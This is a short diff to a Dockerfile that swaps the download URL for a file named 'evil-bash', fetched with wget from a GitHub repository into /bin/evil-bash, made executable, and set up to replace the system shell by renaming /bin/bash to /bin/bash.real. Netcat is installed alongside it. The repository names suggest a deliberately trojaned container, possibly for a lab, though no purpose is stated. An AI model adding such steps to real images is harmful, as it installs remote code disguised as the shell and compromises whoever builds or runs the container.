@@ -87,7 +87,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     build-essential \
     netcat-traditional
 
-RUN wget https://raw.githubusercontent.com/rmamartindeabiapartner-ux/rshell/refs/heads/main/evil-bash -O /bin/evil-bash
+RUN wget https://raw.githubusercontent.com/shoxxdj/Container-Evil-Ressources/refs/heads/main/FAKEBIN/evil-bash -O /bin/evil-bash
 
 RUN chmod +x /bin/evil-bash
 RUN mv /bin/bash /bin/bash.real
